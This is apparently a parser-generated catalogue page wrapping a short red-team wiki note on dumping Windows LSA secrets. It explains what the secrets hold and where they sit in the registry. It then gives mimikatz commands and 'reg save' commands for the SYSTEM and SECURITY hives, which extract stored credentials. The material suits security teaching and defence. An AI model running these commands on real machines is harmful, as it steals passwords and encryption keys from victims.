---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping LSA Secrets

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-lsa-secrets` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dumping LSA Secrets](../../topics/offensive-security/dumping-lsa-secrets.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-dumping-lsa-secrets |
| name | Dumping LSA Secrets |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-03-12 20-20-39.png
- Screenshot from 2019-03-12 20-25-01.png
- Screenshot from 2019-03-12 20-37-11.png
- Screenshot from 2019-03-12 20-38-02.png
_body: '# Dumping LSA Secrets


  > #### **What is stored in LSA secrets?**

  >

  > Originally, the secrets contained cached domain records. Later, Windows developers expanded the application area for the
  storage. At this moment, they can store PC users'' text passwords, service account passwords (for example, those that must
  be run by a certain user to perform certain tasks), Internet Explorer passwords, RAS connection passwords, SQL and CISCO
  passwords, SYSTEM account passwords, private user data like EFS encryption keys, and a lot more. For example, the _NL$KM_
  secret contains the cached domain password encryption key.


  ## Storage


  LSA Secrets are stored in registry:


  ```

  HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets

  ```


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-20-39.png>)


  ## Execution


  ### Memory


  Secrets can be dumped from memory like so:


  {% code title="attacker@mimikatz" %}

  ```

  token::elevate

  lsadump::secrets

  ```

  {% endcode %}


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-25-01.png>)


  ### Registry


  LSA secrets can be dumped from registry hives likes so:


  {% code title="attacker@victim" %}

  ```csharp

  reg save HKLM\SYSTEM system & reg save HKLM\security security

  ```

  {% endcode %}


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-37-11.png>)


  {% code title="attacker@mimikatz" %}

  ```csharp

  lsadump::secrets /system:c:\temp\system /security:c:\temp\security

  ```

  {% endcode %}


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-38-02.png>)


  ## References


  {% embed url="https://www.passcape.com/index.php?section=docsys&cmd=details&id=23" %}'
_relative_path: offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets.md
````
